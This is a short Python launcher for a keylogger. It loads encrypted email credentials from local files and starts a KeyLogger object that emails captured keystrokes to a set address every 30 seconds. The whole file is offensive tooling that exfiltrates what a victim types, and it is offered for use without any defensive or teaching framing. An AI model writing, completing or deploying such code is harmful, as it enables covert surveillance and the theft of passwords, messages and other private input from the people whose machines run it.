from key_logger import KeyLogger
from create_credentials import Credentials
from cryptography.fernet import Fernet
import os

CRED_FILE = 'credentials.ini'
KEY_FILE = 'pvt.key'

SEND_REPORT_EVERY = 30 # seconds
(EMAIL, PASSWORD, TO_EMAIL) = Credentials.read_cred(CRED_FILE, KEY_FILE)

if __name__ == "__main__":
    keylogger = KeyLogger(time_interval=SEND_REPORT_EVERY, sink="email", email=EMAIL, password=PASSWORD, to_email=TO_EMAIL)
    keylogger.run()